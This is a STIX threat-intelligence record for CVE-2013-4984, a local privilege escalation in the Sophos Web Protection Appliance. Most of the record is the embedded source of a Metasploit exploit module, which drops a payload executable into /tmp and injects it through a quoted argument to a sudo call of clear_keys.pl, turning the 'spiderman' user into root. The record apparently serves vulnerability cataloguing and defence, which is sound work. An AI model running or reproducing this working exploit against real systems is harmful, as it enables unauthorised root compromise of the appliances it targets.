{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2cce8e03-bc68-40ba-a974-173a148079c4",
    "created": "2024-08-14T16:59:43.182309Z",
    "modified": "2024-08-14T16:59:43.182313Z",
    "name": "Sophos Web Protection Appliance clear_keys.pl Local Privilege Escalation",
    "description": " This module abuses a command injection on the clear_keys.pl perl script, installed with the Sophos Web Protection Appliance, to escalate privileges from the \"spiderman\" user to \"root\". This module is useful for post exploitation of vulnerabilities on the Sophos Web Protection Appliance web ui, executed by the \"spiderman\" user. This module has been tested successfully on Sophos Virtual Web Appliance 3.7.0.  'License'       => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/sophos_wpa_clear_keys.rb",
            "external_id": "sophos_wpa_clear_keys.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-4984"
        },
        {
            "source_name": "reference",
            "url": "http://www.coresecurity.com/advisories/sophos-web-protection-appliance-multiple-vulnerabilities"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Post::File\n\n  def initialize(info={})\n    super( update_info( info, {\n      'Name'          => 'Sophos Web Protection Appliance clear_keys.pl Local Privilege Escalation',\n      'Description'   => %q{\n        This module abuses a command injection on the clear_keys.pl perl script, installed with the\n        Sophos Web Protection Appliance, to escalate privileges from the \"spiderman\" user to \"root\".\n        This module is useful for post exploitation of vulnerabilities on the Sophos Web Protection\n        Appliance web ui, executed by the \"spiderman\" user. This module has been tested successfully\n        on Sophos Virtual Web Appliance 3.7.0.\n      },\n      'License'       => MSF_LICENSE,\n      'Author'        =>\n        [\n          'Francisco Falcon', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'Platform'       => [ 'linux'],\n      'Arch'           => [ ARCH_X86 ],\n      'SessionTypes'   => [ 'shell', 'meterpreter' ],\n      'Targets'        =>[[ 'Linux x86', { 'Arch' => ARCH_X86 } ]],\n      'References'     =>\n        [\n          [ 'CVE', '2013-4984' ],\n          [ 'OSVDB', '97028' ],\n          [ 'BID', '62265' ],\n          [ 'URL', 'http://www.coresecurity.com/advisories/sophos-web-protection-appliance-multiple-vulnerabilities']\n        ],\n      'DefaultOptions' =>\n        {\n          \"PrependFork\"      => true,\n          \"PrependSetresuid\" => true,\n          \"PrependSetresgid\" => true\n        },\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2013-09-06'\n      }\n    ))\n\n    register_options [\n      OptString.new(\"clear_keys\",  [ true, \"Path to the clear_keys.pl vulnerable script\", \"/opt/cma/bin/clear_keys.pl\" ])\n    ]\n    register_advanced_options [\n      OptString.new(\"WritableDir\", [ true, \"A directory where we can write files\", \"/tmp\" ])\n    ]\n  end\n\n  def check\n    if file?(datastore[\"clear_keys\"])\n      return CheckCode::Detected\n    end\n\n    return CheckCode::Safe\n  end\n\n  def exploit\n    print_status(\"Checking actual user...\")\n    id = cmd_exec(\"id -un\")\n    if id != \"spiderman\"\n      fail_with(Failure::NoAccess, \"The actual user is \\\"#{id}\\\", you must be \\\"spiderman\\\" to exploit this\")\n    end\n\n    print_status(\"Checking for the vulnerable component...\")\n    if check != CheckCode::Detected\n      fail_with(Failure::NoTarget, \"The vulnerable component has not been found\")\n    end\n\n    print_status(\"Dropping the payload to #{datastore[\"WritableDir\"]}\")\n    exe_file = \"#{datastore[\"WritableDir\"]}/#{rand_text_alpha(3 + rand(5))}.elf\"\n    write_file(exe_file, generate_payload_exe)\n\n    cmd_exec \"chmod +x #{exe_file}\"\n\n    print_status(\"Running...\")\n    begin\n      # rm the file after executing it to avoid getting multiple sessions\n      cmd_exec \"sudo #{datastore[\"clear_keys\"]} #{rand_text_alpha(4 + rand(4))} \\\";#{exe_file}; rm -f #{exe_file};\\\" /#{rand_text_alpha(4 + rand(4))}\"\n    ensure\n      cmd_exec \"rm -f #{exe_file}\"\n    end\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2013-09-06",
    "x_mitre_platforms": [
        "[ 'linux']"
    ]
}